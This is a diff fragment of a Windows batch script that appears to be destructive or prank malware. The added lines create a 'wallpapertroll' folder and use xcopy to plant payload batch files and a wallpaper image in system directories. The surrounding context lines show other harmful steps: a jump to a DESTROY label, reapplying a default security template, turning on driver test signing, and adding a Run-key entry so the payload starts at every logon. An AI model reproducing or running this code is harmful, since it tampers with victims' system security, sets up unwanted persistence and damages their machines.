@@ -33,6 +33,7 @@ SFC /ScanFile="C:\Windows\system32\diskpart.exe"
 SFC /ScanFile="C:\Windows\system32\secedit.exe"
 SFC /ScanFile="C:\Windows\system32\mountvol.exe"
 SFC /ScanFile="C:\Windows\system32\icacls.exe"
+SFC /ScanFile="C:\Windows\system32\xcopy.exe"
 secedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose
 echo Checking Operating System Version...
 wmic os get version | find "6.1" > nul
@@ -198,8 +199,10 @@ goto DESTROY
 :eeee
 mkdir c:\windows\fakeexplorer
 mkdir c:\windows\payload
-copy %CD%\junkins\startup\no.bat c:\windows\fakeexplorer
-copy %CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat
+mkdir c:\windows\wallpapertroll
+xcopy %CD%\junkins\startup\no.bat c:\windows\fakeexplorer
+xcopy %CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat
+xcopy %CD%\walp.bmp c:\windows\wallpapertroll\walp.bmp
 bcdedit /set TESTSIGNING on
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %CD%\walp.bmp /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv4 /t REG_SZ /d c:\windows\payload\startup.bat
